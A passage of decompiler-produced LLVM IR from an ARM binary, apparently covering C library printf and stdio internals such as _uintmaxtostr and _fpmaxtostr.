  %v1_10e40 = and i32 %v3_10de4, 2
  %v2_10e40 = icmp eq i32 %v1_10e40, 0
  store i1 %v2_10e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e40, label %dec_label_pc_10e60, label %dec_label_pc_10e48

dec_label_pc_10e48:                               ; preds = %dec_label_pc_10e30, %dec_label_pc_10e40
  %v1_10e48 = and i32 %v4_10dec, 1024
  %v2_10e48 = icmp eq i32 %v1_10e48, 0
  store i1 %v2_10e48, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_10e48, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_10e54 = call i32 @__GI_fseek()
  store i32 %v0_10e54, i32* %r0.global-to-local, align 4
  %v2_10e58 = icmp eq i32 %v0_10e54, 0
  store i1 %v2_10e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e58, label %.dec_label_pc_10e60_crit_edge, label %dec_label_pc_10e04

.dec_label_pc_10e60_crit_edge:                    ; preds = %dec_label_pc_10e48
  %v0_10e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %.dec_label_pc_10e60_crit_edge, %dec_label_pc_10e28, %dec_label_pc_10e40
  %v2_10e70 = phi i32 [ %v0_10e60.pre, %.dec_label_pc_10e60_crit_edge ], [ %v0_10e30, %dec_label_pc_10e28 ], [ %v0_10e30, %dec_label_pc_10e40 ]
  %v1_10e60 = inttoptr i32 %v2_10e70 to i32*
  %v2_10e60 = load i32, i32* %v1_10e60, align 4
  store i32 %v2_10e60, i32* %r3.global-to-local, align 4
  %v1_10e64 = add i32 %v2_10e70, 8
  %v2_10e64 = inttoptr i32 %v1_10e64 to i32*
  %v3_10e64 = load i32, i32* %v2_10e64, align 4
  store i32 %v3_10e64, i32* %r1.global-to-local, align 4
  %v1_10e68 = and i32 %v2_10e60, -4
  store i32 %v1_10e68, i32* %r3.global-to-local, align 4
  %v3_10e6c = sdiv i32 %v2_10e60, 256
  store i32 %v3_10e6c, i32* %r2.global-to-local, align 4
  %v1_10e70 = trunc i32 %v3_10e6c to i8
  %v3_10e70 = add i32 %v2_10e70, 1
  %v4_10e70 = inttoptr i32 %v3_10e70 to i8*
  store i8 %v1_10e70, i8* %v4_10e70, align 1
  %v0_10e74 = load i32, i32* %r1.global-to-local, align 4
  %v1_10e74 = load i32, i32* @r4, align 4
  %v2_10e74 = add i32 %v1_10e74, 20
  %v3_10e74 = inttoptr i32 %v2_10e74 to i32*
  store i32 %v0_10e74, i32* %v3_10e74, align 4
  %v0_10e78 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e78 = trunc i32 %v0_10e78 to i8
  %v2_10e78 = load i32, i32* @r4, align 4
  %v3_10e78 = inttoptr i32 %v2_10e78 to i8*
  store i8 %v1_10e78, i8* %v3_10e78, align 1
  %v0_10e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_10e7c = load i32, i32* @r4, align 4
  %v2_10e7c = add i32 %v1_10e7c, 24
  %v3_10e7c = inttoptr i32 %v2_10e7c to i32*
  store i32 %v0_10e7c, i32* %v3_10e7c, align 4
  %v0_10e80 = load i32, i32* %r1.global-to-local, align 4
  %v1_10e80 = load i32, i32* @r4, align 4
  %v2_10e80 = add i32 %v1_10e80, 16
  %v3_10e80 = inttoptr i32 %v2_10e80 to i32*
  store i32 %v0_10e80, i32* %v3_10e80, align 4
  %v0_10e84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10e84

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e20, %dec_label_pc_10e60
  %v2_10e90 = phi i32 [ %v0_10e30, %dec_label_pc_10e20 ], [ %v0_10e84.pre, %dec_label_pc_10e60 ]
  %v1_10e84 = inttoptr i32 %v2_10e90 to i32*
  %v2_10e84 = load i32, i32* %v1_10e84, align 4
  %v1_10e88 = or i32 %v2_10e84, 64
  store i32 %v1_10e88, i32* %r2.global-to-local, align 4
  %v3_10e8c = sdiv i32 %v2_10e84, 256
  store i32 %v3_10e8c, i32* %r3.global-to-local, align 4
  %v1_10e90 = trunc i32 %v3_10e8c to i8
  %v3_10e90 = add i32 %v2_10e90, 1
  %v4_10e90 = inttoptr i32 %v3_10e90 to i8*
  store i8 %v1_10e90, i8* %v4_10e90, align 1
  %v0_10e94 = load i32, i32* @r4, align 4
  %v1_10e94 = add i32 %v0_10e94, 1
  %v2_10e94 = inttoptr i32 %v1_10e94 to i8*
  %v3_10e94 = load i8, i8* %v2_10e94, align 1
  %v4_10e94 = zext i8 %v3_10e94 to i32
  %v3_10e98 = mul nuw nsw i32 %v4_10e94, 256
  store i32 %v3_10e98, i32* %r3.global-to-local, align 4
  %v1_10e9c = and i32 %v3_10e98, 2816
  store i32 %v1_10e9c, i32* %r0.global-to-local, align 4
  %v2_10e9c = icmp eq i32 %v1_10e9c, 0
  store i1 %v2_10e9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e9c, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_10e84
  %v2_10ea0 = add i32 %v0_10e94, 12
  %v3_10ea0 = inttoptr i32 %v2_10ea0 to i32*
  %v4_10ea0 = load i32, i32* %v3_10ea0, align 4
  store i32 %v4_10ea0, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_10e84
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_10ea8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ea8 = trunc i32 %v0_10ea8 to i8
  %v3_10ea8 = inttoptr i32 %v0_10e94 to i8*
  store i8 %v1_10ea8, i8* %v3_10ea8, align 1
  %v0_10eac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10eac, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_10eac = load i32, i32* %r3.global-to-local, align 4
  %v2_10eac = load i32, i32* @r4, align 4
  %v3_10eac = add i32 %v2_10eac, 28
  %v4_10eac = inttoptr i32 %v3_10eac to i32*
  store i32 %v1_10eac, i32* %v4_10eac, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_10eb0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10eb0, i32* @r4, align 4
  %v8_10eb0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_10eb0

; uselistorder directives
  uselistorder i32 %v3_10e98, { 1, 0 }
  uselistorder i32 %v3_10e8c, { 1, 0 }
  uselistorder i32 %v3_10e6c, { 1, 0 }
  uselistorder i32 %v2_10e70, { 0, 2, 1 }
  uselistorder i1 %v2_10e20, { 1, 0 }
  uselistorder i32 %v3_10e0c, { 1, 0 }
  uselistorder i32 %v0_10e30, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_10dd8, { 1, 0 }
  uselistorder i32 %v5_10dbc, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 3, 4, 2, 5, 1, 6, 7, 8 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_10e84, { 1, 0 }
  uselistorder label %dec_label_pc_10e60, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10e48, { 1, 0 }
  uselistorder label %dec_label_pc_10df8, { 1, 0 }
  uselistorder label %dec_label_pc_10de4, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_10eb4 = load i32, i32* @r2, align 4
  %v1_10eb4 = icmp slt i32 %v0_10eb4, 0
  %v0_10eb8 = load i32, i32* @r0, align 4
  %v1_10ebc = and i32 %v0_10eb8, 2048
  %v2_10ef0 = icmp eq i32 %v1_10ebc, 0
  br i1 %v1_10eb4, label %dec_label_pc_10ef0, label %dec_label_pc_10ec4

dec_label_pc_10ec4:                               ; preds = %entry
  br i1 %v2_10ef0, label %dec_label_pc_10ecc, label %dec_label_pc_10ef8

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10ec4
  %v7_10ecc = icmp eq i32 %v0_10eb8, 256
  %v0_10ed0 = load i32, i32* @r1, align 4
  %v1_10ed0 = inttoptr i32 %v0_10ed0 to i32*
  %v2_10ed0 = load i32, i32* %v1_10ed0, align 4
  %v2_10ed4 = urem i32 %v2_10ed0, 256
  %v2_10ed4.v2_10ed0 = select i1 %v7_10ecc, i32 %v2_10ed4, i32 %v2_10ed0
  br i1 %v7_10ecc, label %.thread, label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10ecc
  %v7_10edc = icmp eq i32 %v0_10eb8, 512
  br i1 %v7_10edc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10edc
  %v4_10ee4 = urem i32 %v2_10ed4.v2_10ed0, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10edc, %dec_label_pc_10ecc, %bb
  %v1_10eec = phi i32 [ %v2_10ed0, %dec_label_pc_10edc ], [ %v2_10ed4, %dec_label_pc_10ecc ], [ %v4_10ee4, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_10eec

dec_label_pc_10ef0:                               ; preds = %entry
  br i1 %v2_10ef0, label %dec_label_pc_10f00, label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ec4, %dec_label_pc_10ef0
  %v0_10ef8 = load i32, i32* @r1, align 4
  %v1_10ef8 = inttoptr i32 %v0_10ef8 to i32*
  %v2_10ef8 = load i32, i32* %v1_10ef8, align 4
  %v3_10ef8 = add i32 %v0_10ef8, 4
  %v4_10ef8 = inttoptr i32 %v3_10ef8 to i32*
  %v5_10ef8 = load i32, i32* %v4_10ef8, align 4
  store i32 %v5_10ef8, i32* @r1, align 4
  ret i32 %v2_10ef8

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ef0
  %v7_10f00 = icmp eq i32 %v0_10eb8, 256
  %v0_10f04 = load i32, i32* @r1, align 4
  %v1_10f04 = inttoptr i32 %v0_10f04 to i32*
  %v2_10f04 = load i32, i32* %v1_10f04, align 4
  %v2_10f08 = urem i32 %v2_10f04, 256
  %v2_10f08.v2_10f04 = select i1 %v7_10f00, i32 %v2_10f08, i32 %v2_10f04
  br i1 %v7_10f00, label %.thread2, label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10f00
  %v7_10f10 = icmp eq i32 %v0_10eb8, 512
  br i1 %v7_10f10, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_10f10
  %v4_10f14 = mul i32 %v2_10f08.v2_10f04, 65536
  %v4_10f18 = sdiv i32 %v4_10f14, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10f10, %dec_label_pc_10f00, %bb5
  %v0_10f1c = phi i32 [ %v2_10f04, %dec_label_pc_10f10 ], [ %v2_10f08, %dec_label_pc_10f00 ], [ %v4_10f18, %bb5 ]
  %v3_10f1c = ashr i32 %v0_10f1c, 31
  store i32 %v3_10f1c, i32* @r1, align 4
  ret i32 %v0_10f1c

; uselistorder directives
  uselistorder i32 %v0_10f1c, { 1, 0 }
  uselistorder i32 %v2_10f08, { 1, 0 }
  uselistorder i32 %v2_10f04, { 1, 2, 0 }
  uselistorder i32 %v2_10ed4, { 1, 0 }
  uselistorder i32 %v2_10ed0, { 1, 2, 0 }
  uselistorder i1 %v2_10ef0, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ef8, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_10f24 = icmp eq i32 %arg2, 256
  br i1 %v7_10f24, label %dec_label_pc_10f50, label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %entry
  %v7_10f2c = icmp eq i32 %arg2, 2048
  br i1 %v7_10f2c, label %dec_label_pc_10f34, label %dec_label_pc_10f3c

dec_label_pc_10f34:                               ; preds = %dec_label_pc_10f2c
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_10f34 = add i32 %tmp2, 4
  %v6_10f34 = inttoptr i32 %v5_10f34 to i32*
  store i32 %arg4, i32* %v6_10f34, align 4
  ret i32 %tmp2

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f2c
  %v7_10f3c = icmp eq i32 %arg2, 512
  br i1 %v7_10f3c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_10f3c
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_10f3c
  %v4_10f40 = sdiv i32 %arg3, 256
  %v1_10f4c = trunc i32 %v4_10f40 to i8
  %v4_10f4c = add i32 %tmp2, 1
  %v5_10f4c = inttoptr i32 %v4_10f4c to i8*
  store i8 %v1_10f4c, i8* %v5_10f4c, align 1
  br label %dec_label_pc_10f50

dec_label_pc_10f50:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 512, { 4, 5, 6, 7, 0, 3, 8, 2, 9, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10f50, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_10f5c = icmp slt i32 %arg4, 0
  %v2_10f5c = icmp eq i32 %arg4, 0
  store i1 %v2_10f5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_10f5c, label %dec_label_pc_10f74, label %dec_label_pc_10f94

dec_label_pc_10f74:                               ; preds = %entry
  %v1_10f74 = icmp slt i32 %arg3, 0
  %v2_10f74 = icmp eq i32 %arg3, 0
  store i1 %v2_10f74, i1* %cpsr_z.global-to-local, align 1
  %v1_10f78 = sub i32 0, %arg4
  store i32 %v1_10f78, i32* %r7.global-to-local, align 4
  br i1 %v1_10f74, label %dec_label_pc_10f80, label %dec_label_pc_10f94

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f74
  %v1_10f84 = sub i32 0, %arg2
  store i32 %v1_10f84, i32* %r5.global-to-local, align 4
  %v2_10f84 = icmp eq i32 %arg2, 0
  %v2_10f88 = icmp eq i1 %v2_10f84, false
  %v5_10f88 = sext i1 %v2_10f88 to i32
  %v6_10f88 = sub i32 %v5_10f88, %arg3
  store i32 %v6_10f88, i32* %r6.global-to-local, align 4
  %v19_10f88 = icmp eq i32 %v6_10f88, 0
  store i1 %v19_10f88, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10f9c

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f74, %entry
  br label %dec_label_pc_10f9c

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f80, %dec_label_pc_10f94
  %storemerge = phi i8 [ 0, %dec_label_pc_10f94 ], [ 1, %dec_label_pc_10f80 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_10fa4 = load i32, i32* %r7.global-to-local, align 4
  %v2_10fac = udiv i32 -1, %v0_10fa4
  store i32 %v2_10fac, i32* %fp.global-to-local, align 4
  %v2_10fbc = urem i32 -1, %v0_10fa4
  %v1_10fc0 = add i32 %v2_10fbc, 1
  store i32 %v1_10fc0, i32* %sb.global-to-local, align 4
  %v9_10fc4 = icmp eq i32 %v1_10fc0, %v0_10fa4
  store i1 %v9_10fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10fc4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10f9c
  %v1_10fc8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_10fc8, i32* %sb.global-to-local, align 4
  %v2_10fcc = add i32 %v2_10fac, 1
  store i32 %v2_10fcc, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10f9c, %bb
  %v0_10fd0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10fd0, i32* %sl.global-to-local, align 4
  %v0_10fd4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10fd4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10fd8

dec_label_pc_10fd8thread-pre-split:               ; preds = %bb21
  %v0_10fd8.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_10fe0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %dec_label_pc_10fd8thread-pre-split, %.thread
  %v0_11048 = phi i32 [ %v0_10fe0.pre, %dec_label_pc_10fd8thread-pre-split ], [ %v0_10fa4, %.thread ]
  %v0_10ff4 = phi i32 [ %v0_10fd8.pr, %dec_label_pc_10fd8thread-pre-split ], [ %v0_10fd0, %.thread ]
  %v2_10fd8 = icmp eq i32 %v0_10ff4, 0
  store i1 %v2_10fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fd8, label %dec_label_pc_11044, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %dec_label_pc_10fd8
  %v2_10fe8 = urem i32 %v0_10ff4, %v0_11048
  %v2_10ff8 = udiv i32 %v0_10ff4, %v0_11048
  store i32 %v2_10ff8, i32* %sl.global-to-local, align 4
  %v0_11004 = load i32, i32* %r6.global-to-local, align 4
  %v2_11008 = urem i32 %v0_11004, %v0_11048
  %v1_11010 = load i32, i32* %sb.global-to-local, align 4
  %v3_11010 = mul i32 %v1_11010, %v2_10fe8
  %v4_11010 = add i32 %v3_11010, %v2_11008
  store i32 %v4_11010, i32* %r5.global-to-local, align 4
  %v2_11018 = udiv i32 %v0_11004, %v0_11048
  %v0_11020 = load i32, i32* %fp.global-to-local, align 4
  %v3_11020 = mul i32 %v0_11020, %v2_10fe8
  %v4_11020 = add i32 %v3_11020, %v2_11018
  %v2_11028 = udiv i32 %v4_11010, %v0_11048
  %v2_11030 = add i32 %v4_11020, %v2_11028
  br label %dec_label_pc_11064

dec_label_pc_11044:                               ; preds = %dec_label_pc_10fd8
  %v0_11044 = load i32, i32* %r6.global-to-local, align 4
  %v2_1105c = udiv i32 %v0_11044, %v0_11048
  br label %dec_label_pc_11064

dec_label_pc_11064:                               ; preds = %dec_label_pc_10fe8, %dec_label_pc_11044
  %storemerge24 = phi i32 [ %v2_1105c, %dec_label_pc_11044 ], [ %v2_11030, %dec_label_pc_10fe8 ]
  %v0_11080 = phi i32 [ %v2_1105c, %dec_label_pc_11044 ], [ %v2_11030, %dec_label_pc_10fe8 ]
  %v1_11080 = phi i32 [ 0, %dec_label_pc_11044 ], [ %v2_10ff8, %dec_label_pc_10fe8 ]
  %v4_11010.pn = phi i32 [ %v0_11044, %dec_label_pc_11044 ], [ %v4_11010, %dec_label_pc_10fe8 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_1106c = urem i32 %v4_11010.pn, %v0_11048
  %v3_11064 = load i32, i32* %stack_var_0, align 4
  %v2_11068 = icmp ugt i32 %v0_1106c, 8
  %v7_11068 = icmp eq i32 %v0_1106c, 9
  store i1 %v7_11068, i1* %cpsr_z.global-to-local, align 1
  %v1_11070 = add i32 %v0_1106c, 48
  %v0_11078 = load i32, i32* %r8.global-to-local, align 4
  %v1_11078 = add i32 %v0_11078, -1
  store i32 %v1_11078, i32* %r8.global-to-local, align 4
  %v2_1107c = xor i1 %v7_11068, true
  %v3_1107c = and i1 %v2_11068, %v2_1107c
  %extract.t = trunc i32 %v1_11070 to i8
  br i1 %v3_1107c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_11064
  %v2_1106c = add i32 %v3_11064, %v0_1106c
  %extract.t8 = trunc i32 %v2_1106c to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_11064, %bb20
  %v0_11084.off0 = phi i8 [ %extract.t, %dec_label_pc_11064 ], [ %extract.t8, %bb20 ]
  %v2_11080 = or i32 %v0_11080, %v1_11080
  %v4_11080 = icmp eq i32 %v2_11080, 0
  store i1 %v4_11080, i1* %cpsr_z.global-to-local, align 1
  %v3_11084 = inttoptr i32 %v1_11078 to i8*
  store i8 %v0_11084.off0, i8* %v3_11084, align 1
  %v0_11088 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11088, label %dec_label_pc_1108c, label %dec_label_pc_10fd8thread-pre-split

dec_label_pc_1108c:                               ; preds = %bb21
  %v2_1108c = load i8, i8* %stack_var_-40, align 1
  %v2_11090 = icmp eq i8 %v2_1108c, 0
  store i1 %v2_11090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11090, label %dec_label_pc_1108c..thread2_crit_edge, label %bb22

dec_label_pc_1108c..thread2_crit_edge:            ; preds = %dec_label_pc_1108c
  %v0_1109c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_1108c
  %v3_11098 = load i32, i32* %r8.global-to-local, align 4
  %v4_11098 = add i32 %v3_11098, -1
  %v5_11098 = inttoptr i32 %v4_11098 to i8*
  store i8 45, i8* %v5_11098, align 1
  %v6_11098 = load i32, i32* %r8.global-to-local, align 4
  %v7_11098 = add i32 %v6_11098, -1
  store i32 %v7_11098, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1108c..thread2_crit_edge, %bb22
  %v0_1109c = phi i32 [ %v0_1109c.pre, %dec_label_pc_1108c..thread2_crit_edge ], [ %v7_11098, %bb22 ]
  ret i32 %v0_1109c

; uselistorder directives
  uselistorder i32 %v0_1106c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11048, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_11064, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_10f9c, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_110a8 = load i32, i32* @r4, align 4
  store i32 %v3_110a8, i32* %stack_var_-36, align 4
  %v6_110a8 = load i32, i32* @r5, align 4
  %v9_110a8 = load i32, i32* @r6, align 4
  %v12_110a8 = load i32, i32* @r7, align 4
  %v15_110a8 = load i32, i32* @r8, align 4
  %v18_110a8 = load i32, i32* @sb, align 4
  %v1_110b0 = add i32 %tmp, 8
  %v2_110b0 = inttoptr i32 %v1_110b0 to i8*
  %v3_110b0 = load i8, i8* %v2_110b0, align 1
  %v4_110b0 = zext i8 %v3_110b0 to i32
  store i32 %v4_110b0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_110b8 = or i32 %v4_110b0, 32
  %v2_110bc = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_110c0 = icmp ult i32 %v1_110b8, 97
  store i1 %v6_110c0, i1* %cpsr_n.global-to-local, align 1
  %v7_110c0 = icmp eq i32 %v1_110b8, 97
  store i1 %v7_110c0, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_110cc = load i32, i32* %arg4, align 4
  store i32 %v2_110cc, i32* %r8.global-to-local, align 4
  br i1 %v7_110c0, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_110d0 = add nuw nsw i32 %v4_110b0, 6
  store i32 %v2_110d0, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_110e4 = phi i32 [ 101, %entry ], [ %v2_110d0, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_110dc = add i32 %tmp, 12
  %v2_110dc = inttoptr i32 %v1_110dc to i32*
  %v3_110dc = load i32, i32* %v2_110dc, align 4
  store i32 %v3_110dc, i32* %r2.global-to-local, align 4
  %v1_110e0 = add i32 %tmp, 4
  %v2_110e0 = inttoptr i32 %v1_110e0 to i32*
  %v3_110e0 = load i32, i32* %v2_110e0, align 4
  store i32 %v3_110e0, i32* %r1.global-to-local, align 4
  br i1 %v7_110c0, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_110e4 = urem i32 %v1_110e4, 256
  store i32 %v2_110e4, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_110e8 = icmp slt i32 %v2_110cc, 0
  store i1 %v1_110e8, i1* %cpsr_n.global-to-local, align 1
  %v2_110e8 = icmp eq i32 %v2_110cc, 0
  store i1 %v2_110e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_110e8, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_110f4 = and i32 %v3_110dc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_110f4 = icmp eq i32 %v1_110f4, 0
  store i1 %v2_110f4, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_110f4, label %dec_label_pc_11108, label %dec_label_pc_11178

dec_label_pc_11108:                               ; preds = %bb184
  %v1_11108 = urem i32 %v3_110dc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11108 = icmp eq i32 %v1_11108, 0
  store i1 %v2_11108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11108, label %.thread10, label %dec_label_pc_11178

dec_label_pc_11178:                               ; preds = %dec_label_pc_11108, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_11108 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_1117c = add i32 %tmp, 16
  %v3_1117c = inttoptr i32 %v2_1117c to i32*
  store i32 32, i32* %v3_1117c, align 4
  %v0_11184 = load i32, i32* %r7.global-to-local, align 4
